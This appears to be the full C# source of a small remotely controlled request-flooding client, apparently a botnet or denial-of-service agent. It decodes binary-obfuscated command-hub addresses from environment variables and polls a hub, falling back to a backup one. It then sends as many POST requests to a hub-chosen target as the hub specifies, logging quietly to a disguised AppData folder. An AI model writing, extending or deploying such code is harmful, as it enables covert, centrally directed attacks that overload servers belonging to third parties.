using System.Text;

namespace stms;

public class MainClass
{
    public static readonly string hub_url = DecodeLink(Environment.GetEnvironmentVariable("HUB_URL"));
    public static readonly string hub_url_backup = DecodeLink(Environment.GetEnvironmentVariable("HUB_URL_BACKUP"));

    private static readonly HttpClient _httpClient = new HttpClient();

    public static void Main()
    {
        Log("Started!");
        MainAsync().GetAwaiter().GetResult();
    }

    public static async Task MainAsync()
    {
        try
        {
            await Handle(hub_url);
        }
        catch (Exception a)
        {
            Log(a.ToString());
            try
            {
                await Handle(hub_url_backup);
            }
            catch (Exception b)
            {
                Log(b.ToString());
                Environment.Exit(0);
            }
        }

        Environment.Exit(0);
    }

    public static async Task Handle(string target_url)
    {
        try
        {
            HttpResponseMessage response = await _httpClient.GetAsync(target_url);
            response.EnsureSuccessStatusCode();
            string jsonResponse = await response.Content.ReadAsStringAsync();

            string url = ExtractJsonString(jsonResponse, "url");
            int count = ExtractJsonInt(jsonResponse, "count");

            if (string.IsNullOrEmpty(url))
                throw new Exception("Empty URL");

            if (int.IsNegative(count))
                throw new Exception("Negative count");

            for (var i = 0; i < count; i++)
            {
                await SendRequest(url);
            }
        }
        catch
        {
            throw;
        }
    }

    public static async Task SendRequest(string target_url)
    {
        try
        {
            var content = new StringContent("{ \"hello\": \"hello world\" }", Encoding.UTF8, "application/json");
            await _httpClient.PostAsync(target_url, content);
        }
        catch
        {
            throw;
        }
    }

    private static string? ExtractJsonString(string json, string key)
    {
        try
        {
            string searchKey = $"\"{key}\"";
            int keyIndex = json.IndexOf(searchKey, StringComparison.OrdinalIgnoreCase);
            if (keyIndex == -1) return null;

            int colonIndex = json.IndexOf(':', keyIndex + searchKey.Length);
            if (colonIndex == -1) return null;

            int firstQuote = json.IndexOf('"', colonIndex);
            if (firstQuote == -1) return null;

            int secondQuote = json.IndexOf('"', firstQuote + 1);
            if (secondQuote == -1) return null;

            return json.Substring(firstQuote + 1, secondQuote - firstQuote - 1);
        }
        catch
        {
            return null;
        }
    }

    private static int ExtractJsonInt(string json, string key)
    {
        try
        {
            string searchKey = $"\"{key}\"";
            int keyIndex = json.IndexOf(searchKey, StringComparison.OrdinalIgnoreCase);
            if (keyIndex == -1) return 0;

            int colonIndex = json.IndexOf(':', keyIndex + searchKey.Length);
            if (colonIndex == -1) return 0;

            int startIndex = colonIndex + 1;
            while (startIndex < json.Length && char.IsWhiteSpace(json[startIndex]))
            {
                startIndex++;
            }

            int endIndex = startIndex;
            while (endIndex < json.Length && (char.IsDigit(json[endIndex]) || json[endIndex] == '-'))
            {
                endIndex++;
            }

            if (int.TryParse(json.Substring(startIndex, endIndex - startIndex), out int result))
            {
                return result;
            }
        }
        catch
        {
            // ignored
        }
        return 0;
    }

    private static string DecodeLink(string link)
    {
        if (string.IsNullOrEmpty(link))
            return null;

        try
        {
            link = link.Replace(" ", "");

            if (link.Length % 8 != 0)
                return null;

            byte[] data = new byte[link.Length / 8];
            for (int i = 0; i < data.Length; i++)
            {
                string dataSegment = link.Substring(i * 8, 8);
                data[i] = Convert.ToByte(dataSegment, 2);
            }

            return Encoding.UTF8.GetString(data);
        }
        catch
        {
            return null;
        }
    }

    public static void Log(string message)
    {
        try
        {
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "data17b", "dl17.log");
            string logMessage = $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} | {message}{Environment.NewLine}";
            File.AppendAllText(path, logMessage);
        }
        catch
        {
            Environment.Exit(0);
        }
    }
}